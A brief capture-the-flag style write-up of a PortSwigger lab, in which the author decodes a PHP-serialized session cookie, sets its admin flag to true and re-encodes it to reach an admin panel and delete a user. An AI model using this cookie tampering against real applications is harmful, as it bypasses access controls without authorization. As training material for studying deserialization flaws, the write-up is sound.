# url
https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects
# objective
The application is using a serialized object in its session cookies. Hack the cookie to gain admin access, then delete the `carlos` users account
# method of solve
Login using the provided credentials `wiener:peter`, then extract the cookie from the web browser, then decode it from base64
```
echo -n 'Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d' | base64 -d
```
We see from the ouput, that the `admin` setting is set to 0 (false). Let's try setting it to 1 (true).
```
echo -n 'O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}' | base64
```
* Take the output of the command, then replace the current cookie with the new one in the web browser
* We then see that we are able to access the admin panel. Access it and delete the `carlos` users account
